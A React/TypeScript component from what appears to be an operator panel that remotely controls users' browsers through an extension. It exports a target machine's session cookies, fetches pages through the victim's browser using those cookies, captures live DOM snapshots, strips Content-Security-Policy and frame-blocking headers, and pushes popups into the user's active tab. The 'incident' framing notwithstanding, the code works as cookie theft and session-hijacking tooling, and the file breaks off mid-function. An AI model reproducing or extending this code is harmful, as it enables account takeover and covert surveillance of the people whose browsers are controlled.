import { useState, useEffect, useRef } from "react";
import { Globe, RefreshCw, AlertCircle, MessageSquare, Ban } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import PopupTemplateModal from "@/components/modals/PopupTemplateModal";
import PopupResponsesPanel from "@/components/PopupResponsesPanel";

interface LiveSiteViewerProps {
  incident: {
    id: string;
    incident_id?: string;
    host: string;
    machine_id: string;
    tab_url?: string;
    cookie_data?: any;
    full_cookie_data?: any;
  };
  onClose: () => void;
}

const PROXY_BASE = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';

type ViewMode = 'shadow' | 'independent';

export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
  const [srcDoc, setSrcDoc] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [cookies, setCookies] = useState<any[]>([]);
  const [currentUrl, setCurrentUrl] = useState<string | null>(null);
  const [iframeKey, setIframeKey] = useState(0);
  const [isPopupModalOpen, setIsPopupModalOpen] = useState(false);
  const [resolvedSession, setResolvedSession] = useState<{ machine_id: string; tab_id: string } | null>(null);
  const [incidentIdForProxy, setIncidentIdForProxy] = useState<string | null>(null);
  const [iframeStatus, setIframeStatus] = useState<'loading' | 'ready' | 'timeout'>('loading');
  
  // Shadow Navigation states
  const [viewMode, setViewMode] = useState<ViewMode>('shadow');
  const [shadowSnapshot, setShadowSnapshot] = useState<any>(null);
  const [independentUrl, setIndependentUrl] = useState<string | null>(null);
  
  // Auto-load tracking
  const autoLoadedRef = useRef(false);

  // Fetch correct incident_id (INC-XXXXX format) for proxy calls
  useEffect(() => {
    // If incident_id is already provided, use it directly
    if (incident.incident_id) {
      console.log('[LocalProxy] Using provided incident_id:', incident.incident_id);
      setIncidentIdForProxy(incident.incident_id);
      return;
    }
    
    // If incident.id already looks like INC-XXX, use it
    if (incident.id.startsWith('INC-')) {
      console.log('[LocalProxy] ID is already incident_id format:', incident.id);
      setIncidentIdForProxy(incident.id);
      return;
    }
    
    // Otherwise fetch from database
    const fetchIncidentId = async () => {
      try {
        const { data } = await supabase
          .from('incidents')
          .select('incident_id')
          .eq('id', incident.id)
          .single();
        
        if (data?.incident_id) {
          console.log('[LocalProxy] Fetched incident_id from DB:', data.incident_id);
          setIncidentIdForProxy(data.incident_id);
        } else {
          setIncidentIdForProxy(incident.id);
        }
      } catch (error) {
        console.error('[LocalProxy] Failed to fetch incident_id:', error);
        setIncidentIdForProxy(incident.id);
      }
    };
    fetchIncidentId();
  }, [incident.id, incident.incident_id]);

  // Shadow Navigation: Subscribe to DOM snapshots
  useEffect(() => {
    if (viewMode !== 'shadow') return;

    console.log('[ShadowView] Setting up real-time subscription for', incident.machine_id);

    const channel = supabase
      .channel('dom-snapshots')
      .on('postgres_changes', 
        {
          event: 'INSERT',
          schema: 'public',
          table: 'dom_snapshots',
          filter: `machine_id=eq.${incident.machine_id}`
        },
        (payload) => {
          console.log('[ShadowView] New snapshot received:', payload.new);
          setShadowSnapshot(payload.new);
          setError(null);
        }
      )
      .subscribe();

    // Fetch latest snapshot on mount
    const fetchLatestSnapshot = async () => {
      try {
        const { data } = await supabase
          .from('dom_snapshots')
          .select('*')
          .eq('machine_id', incident.machine_id)
          .eq('is_latest', true)
          .order('captured_at', { ascending: false })
          .limit(1)
          .maybeSingle();

        if (data) {
          console.log('[ShadowView] Loaded latest snapshot:', data.url);
          setShadowSnapshot(data);
        } else {
          console.log('[ShadowView] No snapshots found yet');
        }
      } catch (error) {
        console.error('[ShadowView] Failed to fetch snapshot:', error);
      }
    };
    
    // ✅ CORREÇÃO #2: Forçar captura manual ao entrar em Shadow Mode
    const forceCaptureSnapshot = async () => {
      try {
        // Buscar user ID primeiro
        const { data: { user } } = await supabase.auth.getUser();
        
        if (!user) {
          console.warn('[ShadowView] No authenticated user');
          return;
        }
        
        // Buscar tab_id ativo
        const { data: session } = await supabase
          .from('active_sessions')
          .select('*')
          .eq('machine_id', incident.machine_id)
          .eq('is_active', true)
          .order('last_activity', { ascending: false })
          .limit(1)
          .maybeSingle();
        
        if (!session) {
          console.warn('[ShadowView] No active session found');
          return;
        }
        
        // Extrair domain corretamente
        const targetUrl = session.url || incident.tab_url || `https://${incident.host}`;
        const targetDomain = new URL(targetUrl).hostname;
        
        // Criar comando capture_dom
        const { data: cmd, error: cmdError } = await supabase
          .from('remote_commands')
          .insert({
            command_type: 'capture_dom',
            target_machine_id: incident.machine_id,
            target_tab_id: session.tab_id,
            target_domain: targetDomain,
            payload: { include_resources: true },
            executed_by: user.id
          })
          .select('id')
          .single();
        
        // ✅ FIX: Verificar erro ANTES de usar cmd.id
        if (cmdError || !cmd) {
          console.error('[ShadowView] Failed to create command:', cmdError);
          return;
        }
        
        // Dispatch via command-dispatcher
        await supabase.functions.invoke('command-dispatcher', {
          body: {
            command_id: cmd.id,
            command_type: 'capture_dom',
            target_machine_id: incident.machine_id,
            target_tab_id: session.tab_id,
            payload: { include_resources: true }
          }
        });
        
        console.log('[ShadowView] ✅ Forced snapshot capture:', cmd.id);
      } catch (error) {
        console.error('[ShadowView] Failed to force snapshot:', error);
      }
    };
    
    fetchLatestSnapshot();
    forceCaptureSnapshot();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [viewMode, incident.machine_id]);

  // Render content based on view mode
  useEffect(() => {
    if (viewMode === 'shadow' && shadowSnapshot) {
      // ✅ CORREÇÃO #1: Processar HTML completo com shadow flag
      // SHADOW MODE: Render captured DOM with full processing (sem AntiRedirect)
      const step1 = processContent(shadowSnapshot.html_content, shadowSnapshot.url, 'direct', { shadow: true });
      const step2 = injectNavigationInterceptor(step1, shadowSnapshot.url);
      
      setIframeKey(k => k + 1);
      setSrcDoc(step2);
      setCurrentUrl(shadowSnapshot.url);
    } else if (viewMode === 'independent' && independentUrl) {
      // INDEPENDENT MODE: Fetch and process (previous behavior)
      handleNavigation(independentUrl);
    }
  }, [viewMode, shadowSnapshot, independentUrl]);

  // Inject minimal navigation interceptor (no URL rewriting needed)
  const injectNavigationInterceptor = (html: string, baseUrl: string): string => {
    const script = `
    <script>
      const BASE_URL = "${baseUrl}";
      const INCIDENT_ID = "${incident.id}";
      
      // Interceptar cliques em links
      document.addEventListener('click', (e) => {
        const link = e.target.closest('a');
        if (link && link.href) {
          e.preventDefault();
          console.log('[ShadowView] Link clicked:', link.href);
          window.parent.postMessage({
            type: 'local-proxy:navigate',
            url: link.href,
            incidentId: INCIDENT_ID
          }, '*');
        }
      }, true);
      
      // Interceptar submits de formulários
      document.addEventListener('submit', (e) => {
        e.preventDefault();
        const form = e.target;
        const action = form.action || BASE_URL;
        console.log('[ShadowView] Form submitted:', action);
        window.parent.postMessage({
          type: 'local-proxy:navigate',
          url: action,
          incidentId: INCIDENT_ID
        }, '*');
      }, true);
      
      console.log('[ShadowView] Navigation interceptor active');
    </script>
  `;
    
    // Inject after <head> or before </body>
    if (html.includes('</head>')) {
      return html.replace('</head>', `${script}</head>`);
    } else if (html.includes('</body>')) {
      return html.replace('</body>', `${script}</body>`);
    } else {
      return html + script;
    }
  };

  // Auto-load first page on mount
  useEffect(() => {
    if (autoLoadedRef.current) return;
    
    const startUrl = incident.tab_url || `https://${incident.host}`;
    console.log('[AutoLoad] Initializing auto-load for:', startUrl);
    
    if (viewMode === 'shadow') {
      // Give shadow view 800ms to load a snapshot
      setTimeout(() => {
        if (!shadowSnapshot) {
          console.log('[AutoLoad] No snapshot yet, falling back to Independent mode');
          setViewMode('independent');
          setIndependentUrl(startUrl);
          loadSiteWithCookies(startUrl);
        } else {
          console.log('[AutoLoad] Shadow snapshot loaded, skipping independent fallback');
        }
      }, 800);
    } else {
      console.log('[AutoLoad] Starting in Independent mode');
      setIndependentUrl(startUrl);
      loadSiteWithCookies(startUrl);
    }
    
    autoLoadedRef.current = true;
  }, [incident.id]);

  // Parse cookies from incident data
  useEffect(() => {
    const cookieSource = incident.full_cookie_data 
      || incident.cookie_data 
      || (incident as any).cookie_excerpt 
      || (incident as any).cookieExcerpt;
    
    if (cookieSource) {
      try {
        let parsedData;
        
        if (typeof cookieSource === 'string') {
          try {
            parsedData = JSON.parse(cookieSource);
          } catch {
            if (cookieSource.includes('=')) {
              parsedData = cookieSource.split(';').map(pair => {
                const [name, ...valueParts] = pair.trim().split('=');
                return {
                  name: name.trim(),
                  value: valueParts.join('=').trim(),
                  domain: incident.host,
                  path: '/'
                };
              }).filter(c => c.name && c.value);
            }
          }
        } else {
          parsedData = cookieSource;
        }

        let cookieArray = [];
        
        if (Array.isArray(parsedData)) {
          cookieArray = parsedData
            .filter(c => c && typeof c === 'object' && c.name && c.value && c._type !== 'undefined')
            .map(c => ({
              ...c,
              domain: c.domain || incident.host,
              path: c.path || '/'
            }));
        } else if (parsedData && typeof parsedData === 'object') {
          cookieArray = Object.entries(parsedData)
            .filter(([name, value]) => name && value && value !== 'undefined')
            .map(([name, value]) => ({
              name,
              value: String(value),
              domain: incident.host,
              path: '/'
            }));
        }
        
        console.log('[LocalProxy] Parsed cookies:', cookieArray.length, 'cookies');
        setCookies(cookieArray);
      } catch (error) {
        console.error('Error parsing cookie data:', error);
        setCookies([]);
      }
    } else {
      setCookies([]);
    }
  }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);

  // Fetch raw content - ALWAYS use extension tunnel (forced)
  const fetchRawContent = async (url: string, overrideCookies?: any[]): Promise<string> => {
    const proxyIncidentId = incidentIdForProxy || incident.id;
    const cookiesToUse = overrideCookies || cookies;
    
    console.log('[ExtensionProxy] Requesting fetch via extension');
    console.log('[ExtensionProxy] Using cookies count:', cookiesToUse.length);
    
    // Normalize machine_id (handle both snake_case and camelCase)
    const targetMachineId = incident.machine_id || (incident as any).machineId;
    
    // 1. Get active session
    const domain = new URL(url).hostname;
    const { data: sessions } = await supabase
      .from('active_sessions')
      .select('*')
      .eq('domain', domain)
      .eq('machine_id', targetMachineId)
      .eq('is_active', true)
      .order('last_activity', { ascending: false })
      .limit(1);
    
    const activeSession = sessions?.[0];
    
    if (!activeSession) {
      console.warn('[ExtensionProxy] Nenhuma sessão ativa encontrada', { domain, targetMachineId });
      throw new Error('Nenhuma sessão ativa encontrada. Usuário pode estar offline.');
    }
    
    // 2. Create command
    const { data: commandData, error: commandError } = await supabase
      .from('remote_commands')
      .insert({
        command_type: 'proxy-fetch',
        target_machine_id: targetMachineId,
        target_tab_id: activeSession.tab_id,
        status: 'pending',
        payload: {
          target_url: url,
          cookies: cookiesToUse
        },
        executed_by: (await supabase.auth.getUser()).data.user?.id
      })
      .select('id')
      .single();
    
    if (commandError) {
      throw new Error(`Falha ao criar comando: ${commandError.message}`);
    }
    
    const commandId = commandData.id;
    console.log('[ExtensionProxy] Command created:', commandId);
    
    // 3. Send via dispatcher
    console.log('[ExtensionProxy] Dispatching proxy-fetch with machine:', targetMachineId);
    const { data: dispatchData, error: dispatchError } = await supabase.functions.invoke('command-dispatcher', {
      body: {
        command_id: commandId,
        command_type: 'proxy-fetch',
        target_machine_id: targetMachineId,
        target_tab_id: activeSession.tab_id,
        payload: {
          target_url: url,
          cookies: cookiesToUse
        }
      }
    });
    
    if (dispatchError) {
      throw new Error(`Falha no dispatcher: ${dispatchError.message}`);
    }
    
    console.log('[ExtensionProxy] Dispatch status:', {
      success: dispatchData?.success,
      status: dispatchData?.status,
      machine_online: dispatchData?.success === true
    });
    
    if (!dispatchData?.success && dispatchData?.status !== 'queued') {
      console.warn('[ExtensionProxy] ⚠️ Máquina offline - comando será entregue via polling quando usuário conectar');
    }
    
    if (dispatchData?.status === 'queued') {
      console.log('[ExtensionProxy] ✅ Máquina online - comando enfileirado, será entregue via polling');
    }
    
    // 4. Poll for result in proxy_fetch_results (NOT popup_responses!)
    const maxAttempts = 30; // 15 seconds
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(resolve => setTimeout(resolve, 500));
      
      const { data: result } = await supabase
        .from('proxy_fetch_results')
        .select('*')
        .eq('command_id', commandId)
        .maybeSingle();
      
      if (result) {
        console.log('[ExtensionProxy] ✅ Got result from extension:', {
          success: result.success,
          html_length: result.html_content?.length || 0
        });
        
        if (!result.success) {
          console.error('[ExtensionProxy] ❌ Extension fetch failed:', {
            url: url,
            htmlLength: result.html_content?.length || 0,
            error: result.error || 'Unknown error',
            cookies: cookiesToUse.length
          });
          throw new Error(result.error || 'Fetch failed - check console for details');
        }
        
        return result.html_content;
      }
    }
    
    throw new Error(
      `⏱️ Timeout aguardando resposta da extensão (15s)\n\n` +
      `📊 Diagnóstico:\n` +
      `• Command ID: ${commandId}\n` +
      `• Dispatcher Status: ${dispatchData?.status || 'unknown'}\n` +
      `• Machine Online: ${dispatchData?.success ? '✅ SIM' : '❌ NÃO'}\n\n` +
      `🔍 Possíveis causas:\n` +
      `${!dispatchData?.success ? '• Usuário está offline (extensão não conectada via WebSocket)\n' : ''}` +
      `• Extensão não processou o comando\n` +
      `• Erro ao fazer fetch do site\n` +
      `• Cookies inválidos ou expirados\n\n` +
      `💡 Verifique:\n` +
      `• Console da extensão (background.js)\n` +
      `• Se o usuário tem a tab aberta no domínio\n` +
      `• Logs do edge function command-dispatcher`
    );
  };

  // Process HTML content locally: rewrite URLs and inject interception script
  const processContent = (html: string, baseUrl: string, assetsMode: 'direct' | 'proxy' = 'direct', options?: { shadow?: boolean }): string => {
    console.log('[LocalProxy] Processing content for:', baseUrl);
    console.log('[LocalProxy] Assets mode:', assetsMode);
    console.log('[LocalProxy] Shadow mode:', options?.shadow || false);
    
    const base = new URL(baseUrl);
    const origin = `${base.protocol}//${base.host}`;
    const proxyIncidentId = incidentIdForProxy || incident.id;
    
    let processed = html;
    
    // 🔓 STEP 1: Remove ALL existing CSP and frame-blocking headers AGGRESSIVELY
    processed = processed.replace(/<meta[^>]+http-equiv=["']Content-Security-Policy(-Report-Only)?["'][^>]*>/gi, '');
    processed = processed.replace(/<meta[^>]+name=["']?x-frame-options["']?[^>]*>/gi, '');
    processed = processed.replace(/<meta[^>]+content=["'][^"']*frame-options[^"']*["'][^>]*>/gi, '');
    
    // Remove CSP defined in inline scripts (common in Gmail)
    processed = processed.replace(/<script[^>]*>[\s\S]*?Content-Security-Policy[\s\S]*?<\/script>/gi, '');
    console.log('[LocalProxy] 🧹 Removed inline CSP definitions');
    
    // ✅ SHADOW MODE: Remove ALL scripts and on* attributes
    if (options?.shadow) {
      // Remove all <script> tags
      processed = processed.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
      console.log('[LocalProxy] 🧹 Removed all <script> tags (shadow mode)');
      
      // Remove all on* event attributes
      processed = processed.replace(/\son[a-z\-]+\s*=\s*["'][^"']*["']/gi, '');
      console.log('[LocalProxy] 🧹 Removed all on* attributes (shadow mode)');
    }
    
    // ✅ FIX: STEP 2 - Inject CSP FIRST (before base tag)
    const csp = options?.shadow 
      ? `<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline'; script-src 'none'; connect-src 'none'; worker-src 'none'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:; frame-src *; base-uri *;">`
      : `<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:; connect-src *; frame-src *; base-uri *;">`;
    
    if (processed.includes('<head>')) {
      processed = processed.replace('<head>', `<head>\n${csp}`);
      console.log(`[LocalProxy] ✅ Injected ${options?.shadow ? 'strict' : 'permissive'} CSP at top of <head>`);
    }
    
    // 🔗 STEP 3: Inject <base href> AFTER CSP
    const baseTag = `<base href="${origin}">`;
    if (processed.includes('<head>')) {
      processed = processed.replace('<head>', `<head>\n${baseTag}`);
      console.log('[LocalProxy] ✅ Injected <base href> after CSP');
    }
    
    // 🔗 STEP 4: Convert relative script src to absolute URLs
    processed = processed.replace(/<script([^>]*)\ssrc=["']\/([^"']+)["']/gi, (match, attrs, path) => {
      return `<script${attrs} src="${origin}/${path}"`;
    });
    console.log('[LocalProxy] 🔗 Converted relative script URLs to absolute');
    
    // Rewrite assets - always convert relative URLs to absolute
    // Rewrite CSS links
    processed = processed.replace(
      /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          // Skip only absolute HTTP(S) and special protocols
          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
            return match;
          }
          
          // Normalize protocol-relative and relative URLs
          let absolute;
          if (url.startsWith('//')) {
            // Protocol-relative: //example.com/path → https://example.com/path
            absolute = `https:${url}`;
          } else {
            // Relative: /path or path → https://origin/path
            absolute = new URL(url, origin).href;
          }
          
          if (assetsMode === 'proxy') {
            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
            return `${prefix}${proxied}${suffix}`;
          }
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite Scripts
    processed = processed.replace(
      /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          // Skip only absolute HTTP(S) and special protocols
          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
            return match;
          }
          
          // Normalize protocol-relative and relative URLs
          let absolute;
          if (url.startsWith('//')) {
            absolute = `https:${url}`;
          } else {
            absolute = new URL(url, origin).href;
          }
          
          if (assetsMode === 'proxy') {
            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
            return `${prefix}${proxied}${suffix}`;
          }
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite Images
    processed = processed.replace(
      /(<img[^>]+src=["'])([^"']+)(["'])/gi,
      (match, prefix, url, suffix) => {
        try {
          // Skip only absolute HTTP(S) and special protocols
          if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('data:') || url.startsWith('blob:')) {
            return match;
          }
          
          // Normalize protocol-relative and relative URLs
          let absolute;
          if (url.startsWith('//')) {
            absolute = `https:${url}`;
          } else {
            absolute = new URL(url, origin).href;
          }
          
          if (assetsMode === 'proxy') {
            const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${proxyIncidentId}&rawContent=true`;
            return `${prefix}${proxied}${suffix}`;
          }
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Always rewrite anchors and forms for navigation interception (make them absolute)
    processed = processed.replace(
      /(<a\s[^>]*href=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite forms - keep original URLs without data attributes
    processed = processed.replace(
      /(<form\s[^>]*action=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // 📍 STEP 5: Inject anti-redirect and interception scripts (SKIP in shadow mode)
    const antiRedirectScript = options?.shadow ? '' : `
<script>
(function() {
  const BASE_URL = ${JSON.stringify(baseUrl)};
  const INCIDENT_ID = ${JSON.stringify(proxyIncidentId)};
  
  // 🚫 Block all redirects (ONLY in independent mode)
  const originalAssign = window.location.assign;
  const originalReplace = window.location.replace;
  
  window.location.assign = function(url) {
    console.log('[AntiRedirect] Blocked assign to:', url);
    return false;
  };
  
  window.location.replace = function(url) {
    console.log('[AntiRedirect] Blocked replace to:', url);
    return false;
  };
  
  // ❌ REMOVED: Don't redefine href property (causes errors)
  console.log('[AntiRedirect] Protection active');
  
  // 🔗 UNIVERSAL URL NORMALIZER (for dynamically added elements)
  const ORIGIN = new URL(BASE_URL).origin;

  function normalizeUrl(url) {
    if (!url || url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:') || url.startsWith('#')) {
      return url;
    }
    
    // Already absolute
    if (url.startsWith('http://') || url.startsWith('https://')) {
      return url;
    }
    
    // Protocol-relative: //example.com/path
    if (url.startsWith('//')) {
      return 'https:' + url;
    }
    
    // Relative: /path or path
    try {
      return new URL(url, ORIGIN).href;
    } catch {
      return url;
    }
  }

  // Intercept setAttribute for ALL dynamic elements
  const originalSetAttribute = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function(name, value) {
    if ((name === 'src' || name === 'href' || name === 'action') && typeof value === 'string') {
      const normalized = normalizeUrl(value);
      if (normalized !== value) {
        console.log('[Normalizer] ' + name + ': ' + value + ' → ' + normalized);
      }
      value = normalized;
    }
    return originalSetAttribute.call(this, name, value);
  };

  // Override property setters for common elements
  const descriptors = {
    script: { prop: 'src', proto: HTMLScriptElement.prototype },
    img: { prop: 'src', proto: HTMLImageElement.prototype },
    link: { prop: 'href', proto: HTMLLinkElement.prototype },
    iframe: { prop: 'src', proto: HTMLIFrameElement.prototype },
    form: { prop: 'action', proto: HTMLFormElement.prototype }
  };

  Object.entries(descriptors).forEach(function(entry) {
    const tag = entry[0];
    const config = entry[1];
    const prop = config.prop;
    const proto = config.proto;
    
    const original = Object.getOwnPropertyDescriptor(proto, prop);
    if (original && original.set) {
      Object.defineProperty(proto, prop, {
        configurable: original.configurable,
        enumerable: original.enumerable,
        get: original.get,
        set: function(value) {
          const normalized = normalizeUrl(value);
          if (normalized !== value) {
            console.log('[Normalizer] ' + tag + '.' + prop + ': ' + value + ' → ' + normalized);
          }
          return original.set.call(this, normalized);
        }
      });
    }
  });

  // MutationObserver for newly added elements
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) { // Element
          // Normalize the node and all its descendants
          const elements = [node];
          const descendants = node.querySelectorAll ? node.querySelectorAll('[src], [href], [action]') : [];
          for (let i = 0; i < descendants.length; i++) {
            elements.push(descendants[i]);
          }
          
          elements.forEach(function(el) {
            ['src', 'href', 'action'].forEach(function(attr) {
              const value = el.getAttribute(attr);
              if (value) {
                const normalized = normalizeUrl(value);
                if (normalized !== value) {
                  el.setAttribute(attr, normalized);
                }
              }
            });
          });
        }
      });
    });
  });

  observer.observe(document, { childList: true, subtree: true });

  console.log('[LocalProxy] 🌐 Universal URL normalizer active for:', ORIGIN);
  console.log('[LocalProxy] Interception active for:', BASE_URL);
  console.log('[AntiRedirect] Protection active');
  
  // Intercept all link clicks - use href directly (already absolute URLs)
  document.addEventListener('click', function(e) {
    const target = e.target.closest('a');
    if (!target || !target.href) return;
    
    // Skip special protocols
    const href = target.href;
    if (href.startsWith('javascript:') || href.startsWith('mailto:') || href.startsWith('tel:') || href.startsWith('#')) {
      return;
    }
    
    e.preventDefault();
    e.stopPropagation();
    
    console.log('[LocalProxy] Navigate to:', href);
    window.parent.postMessage({ type: 'local-proxy:navigate', url: href, incidentId: INCIDENT_ID }, '*');
  }, true);
  
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form.method.toUpperCase() === 'GET') {
      e.preventDefault();
      const formData = new FormData(form);
      const params = new URLSearchParams(formData);
      const action = form.action;
      const destination = action + '?' + params.toString();
      console.log('[LocalProxy] Form navigate to:', destination);
      window.parent.postMessage({ type: 'local-proxy:navigate', url: destination, incidentId: INCIDENT_ID }, '*');
    }
  }, true);
  
  // Override window.open
  const originalOpen = window.open;
  window.open = function(url) {
    if (url) {
      window.parent.postMessage({ type: 'local-proxy:navigate', url: url, incidentId: INCIDENT_ID }, '*');
    }
    return null;
  };
  
  // Send ready signal
  window.parent.postMessage({ type: 'local-proxy:ready', url: BASE_URL }, '*');
})();
</script>`;
    
    // Inject script before closing </head> or </body>
    if (processed.includes('</head>')) {
      processed = processed.replace('</head>', `${antiRedirectScript}</head>`);
    } else if (processed.includes('</body>')) {
      processed = processed.replace('</body>', `${antiRedirectScript}</body>`);
    } else {
      processed = processed + antiRedirectScript;
    }
    
    return processed;
  };

  // Handle navigation within the proxied site
  const handleNavigation = async (targetUrl: string, overrideCookies?: any[]) => {
    console.log('[LocalProxy] Navigating to:', targetUrl);
    setError(null);
    setCurrentUrl(targetUrl);
    
    try {
      const rawHtml = await fetchRawContent(targetUrl, overrideCookies);
      // Always use 'direct' mode since we're forcing extension tunnel
      const processedHtml = processContent(rawHtml, targetUrl, 'direct');
      
      // Update iframe with new content
      setIframeKey(k => k + 1);
      setSrcDoc(processedHtml);
      
      toast.success('Página carregada');
    } catch (err: any) {
      console.error('[LocalProxy] Navigation error:', err);
      setError(err.message || 'Erro ao navegar');
      toast.error('Falha ao carregar página');
    }
  };

  // Listen for navigation messages from iframe
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'local-proxy:ready') {
        console.log('[LocalProxy] ✅ Ready signal received:', event.data.url);
        return;
      }
      
      if (event.data?.type === 'local-proxy:navigate') {
        const { url, incidentId } = event.data;
        // Relaxed check: allow events without incidentId
        if (incidentId && incidentId !== incident.id) return;
        
        handleNavigation(url);
      }
    };
    
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [incident.id, cookies]);

  const loadSiteWithCookies = async (targetUrl?: string) => {
    const url = targetUrl || incident.tab_url;
    if (!url) {
      setError('URL do site não disponível');
      return;
    }

    // Try to export fresh cookies if there's an active session
    try {
      const targetMachineId = incident.machine_id || (incident as any).machineId;
      const { data: sessions } = await supabase
        .from('active_sessions')
        .select('machine_id, tab_id')
        .eq('domain', incident.host)
        .eq('machine_id', targetMachineId)
        .eq('is_active', true)
        .order('last_activity', { ascending: false })
        .limit(1);
      
      if (sessions && sessions.length > 0) {
        const session = sessions[0];
        console.log('Active session found, requesting fresh cookies...');
        
        // Use exportIncidentId directly (avoid invalid query)
        const exportIncidentId = incidentIdForProxy || incident.incident_id || (incident.id.startsWith('INC-') ? incident.id : null);
        console.log('[LocalProxy] Using exportIncidentId:', exportIncidentId);
        
        if (exportIncidentId) {
          // Send export_cookies command
          console.log('[LocalProxy] Sending export_cookies for incident:', exportIncidentId);
          await fetch(`https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              command_type: 'export_cookies',
              target_machine_id: session.machine_id,
              target_tab_id: session.tab_id,
              payload: { incident_id: exportIncidentId }
            })
          });

          // Poll incident for fresh cookies (up to ~10s)
          let freshCookies: any[] | null = null;
          let attempts = 0;
          let cookieCount = 0;
          while (attempts < 7) {
            const { data: updated } = await supabase
              .from('incidents')
              .select('full_cookie_data, cookie_excerpt')
              .eq('incident_id', exportIncidentId)
              .single();

            const src = (updated as any)?.full_cookie_data ?? (updated as any)?.cookie_excerpt;
            
            // Parse fresh cookies
            if (src) {
              try {
                let parsedData = typeof src === 'string' ? JSON.parse(src) : src;
                if (Array.isArray(parsedData)) {
                  freshCookies = parsedData.filter(c => c && c.name && c.value);
                  cookieCount = freshCookies.length;
                } else if (typeof src === 'string' && src.includes('=')) {
                  cookieCount = src.split(';').filter(Boolean).length;
                }
              } catch (e) {
                console.error('Error parsing fresh cookies:', e);
              }
            }

            if (cookieCount > 10) break;
            await new Promise(r => setTimeout(r, 1500));
            attempts++;
          }
          
          console.log(`Fresh cookies ready: ~${cookieCount} items`);
          if (freshCookies && freshCookies.length > 0) {
            console.log('[LocalProxy] Using', freshCookies.length, 'fresh cookies for extension proxy');
            setCookies(freshCookies);
            toast.success(`Cookies atualizados: ${freshCookies.length}`);
          } else if (cookieCount > 0) {
            toast.success(`Cookies atualizados: ${cookieCount}`);
          }
        }
      }
    } catch (error) {
      console.error('Failed to export fresh cookies:', error);
      // Continue with existing cookies
    }

    // Wait a bit for setCookies to update state, then navigate
    await new Promise(resolve => setTimeout(resolve, 100));
    await handleNavigation(url);
  };

  const refreshSite = () => {
    setSrcDoc(null);
    setTimeout(() => loadSiteWithCookies(), 100);
  };

  // Resolve the active session (machine_id/tab_id) for this incident's domain before opening the popup
  const handleOpenPopup = async () => {
    try {
      // Prioritize machine_id from incident and only get truly active sessions (last 60s)
      const machineId = (incident as any).machine_id;
      const sixtySecondsAgo = new Date(Date.now() - 60000).toISOString();
      
      let query = supabase
        .from('active_sessions')
        .select('machine_id, tab_id, domain, last_activity')
        .eq('is_active', true)
        .gte('last_activity', sixtySecondsAgo)
        .order('last_activity', { ascending: false });
      
      // If we have machine_id from incident, prioritize it
      if (machineId) {
        query = query.eq('machine_id', machineId);
      } else {
        query = query.eq('domain', incident.host);
      }
      
      const { data, error } = await query.limit(1);

      if (error) {
        console.error('Erro ao buscar sessão ativa:', error);
        setResolvedSession(null);
        setIsPopupModalOpen(true);
        return;
      }

      if (data && data.length > 0) {
        setResolvedSession({ machine_id: data[0].machine_id, tab_id: data[0].tab_id });
      } else {
        setResolvedSession(null);
      }
    } catch (e) {
      console.error('Falha ao resolver sessão ativa:', e);
      setResolvedSession(null);
    } finally {
      setIsPopupModalOpen(true);
    }
  };

  const blockSiteForMachine = async () => {
    const machineId = (incident as any).machine_id;
    
    if (!machineId) {
      toast.error('ID da máquina não disponível');
      return;
    }

    try {
      const { error } = await supabase
        .from('machine_blocked_domains')
        .insert({
          machine_id: machineId,
          domain: incident.host,
          reason: 'Bloqueado via visualizador de site',
          blocked_by: (await supabase.auth.getUser()).data.user?.id
        });

      if (error) throw error;

